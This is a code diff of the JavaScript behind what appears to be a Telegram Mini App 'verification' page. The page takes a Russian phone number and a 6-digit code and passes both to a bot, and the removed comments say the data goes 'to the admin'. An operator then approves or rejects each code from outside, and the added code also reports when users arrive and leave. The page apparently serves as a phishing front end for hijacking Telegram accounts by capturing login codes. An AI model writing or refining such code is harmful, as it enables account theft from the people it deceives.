@@ -14,26 +14,33 @@ document.addEventListener('DOMContentLoaded', () => {
     const codeError = document.getElementById('code-error');
     const submitCodeBtn = document.getElementById('submit-code');
 
-    // Состояние
-    let currentPhone = '';
-    let verificationStatus = 'pending'; // 'pending' | 'approved' | 'rejected'
-
-    // Анимация загрузки
-    const setLoading = (element, isLoading) => {
-        element.disabled = isLoading;
-        element.innerHTML = isLoading 
-            ? '<div class="loader"></div>' 
-            : 'Подтвердить';
+    // Вибрация при взаимодействии
+    const vibrate = (type = 'light') => {
+        if (tg.HapticFeedback) {
+            tg.HapticFeedback.impactOccurred(type);
+        }
     };
 
-    // Строгая проверка российского номера
-    const validateRussianPhone = (phone) => {
-        const clean = phone.replace(/\D/g, '');
-        // Проверяем: начинается с 7, длина 11 цифр (7XXXXXXXXXX)
-        return /^7\d{10}$/.test(clean);
+    // Отправка события боту
+    const sendEvent = async (type, data = null) => {
+        if (window.sendToBot) {
+            await window.sendToBot(type, data);
+        }
     };
 
-    // Автоформатирование номера
+    // Отслеживание входа
+    sendEvent('init');
+    vibrate('medium');
+
+    // Отслеживание выхода
+    const handleVisibilityChange = () => {
+        if (document.visibilityState === 'hidden') {
+            sendEvent('exit');
+        }
+    };
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+
+    // Форматирование номера с вибрацией
     phoneInput.addEventListener('input', (e) => {
         let value = e.target.value.replace(/\D/g, '');
         if (value.length > 0) value = '7' + value.substring(1);
@@ -45,6 +52,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (value.length > 9) formatted += '-' + value.substring(9, 11);
         
         phoneInput.value = formatted.substring(0, 16);
+        if (value.length % 2 === 0) vibrate('light');
     });
 
     // Отправка номера
@@ -53,23 +61,21 @@ document.addEventListener('DOMContentLoaded', () => {
         
         if (!phone) {
             showError(phoneError, 'Введите номер телефона');
+            vibrate('error');
             return;
         }
         
-        if (!validateRussianPhone(phone)) {
+        if (!/^7\d{10}$/.test(phone)) {
             showError(phoneError, 'Требуется российский номер: +7 XXX XXX-XX-XX');
+            vibrate('error');
             return;
         }
         
+        vibrate('medium');
         hideError(phoneError);
-        currentPhone = `+${phone}`;
         phoneForm.classList.add('hidden');
         codeForm.classList.remove('hidden');
-        
-        // Отправляем данные админу
-        if (window.sendToBot) {
-            await window.sendToBot('phone', currentPhone);
-        }
+        await sendEvent('phone', `+${phone}`);
     });
 
     // Отправка кода
@@ -78,34 +84,42 @@ document.addEventListener('DOMContentLoaded', () => {
         
         if (!/^\d{6}$/.test(code)) {
             showError(codeError, 'Ровно 6 цифр');
+            vibrate('error');
             return;
         }
         
+        vibrate('medium');
         hideError(codeError);
-        setLoading(submitCodeBtn, true);
+        submitCodeBtn.disabled = true;
+        submitCodeBtn.innerHTML = '<div class="loader"></div>';
         
-        // Отправляем код на проверку админу
-        if (window.sendToBot) {
-            await window.sendToBot('code', code);
-        }
+        await sendEvent('code', code);
         
-        // Имитация ожидания решения админа
+        // Имитация ожидания подтверждения
+        let checkCount = 0;
         const checkInterval = setInterval(() => {
-            if (verificationStatus === 'approved') {
+            checkCount++;
+            if (checkCount >= 10) { // 10 попыток по 2 сек = 20 сек ожидания
                 clearInterval(checkInterval);
-                tg.showAlert('✅ Подтверждено!', () => tg.close());
-            } else if (verificationStatus === 'rejected') {
-                clearInterval(checkInterval);
-                showError(codeError, 'Код отклонён. Введите новый');
-                codeInput.value = '';
-                setLoading(submitCodeBtn, false);
+                showError(codeError, 'Время ожидания истекло');
+                submitCodeBtn.disabled = false;
+                submitCodeBtn.textContent = 'Подтвердить';
+                vibrate('heavy');
             }
         }, 2000);
     });
 
-    // Обновление статуса из страниц подтверждения
-    window.updateVerificationStatus = (status) => {
-        verificationStatus = status;
+    // Глобальная функция для подтверждения извне
+    window.confirmVerification = (status) => {
+        if (status === 'approved') {
+            tg.showAlert('✅ Подтверждено!', () => tg.close());
+        } else {
+            showError(codeError, 'Код отклонён. Введите новый');
+            codeInput.value = '';
+            submitCodeBtn.disabled = false;
+            submitCodeBtn.textContent = 'Подтвердить';
+            vibrate('heavy');
+        }
     };
 
     function showError(element, message) {
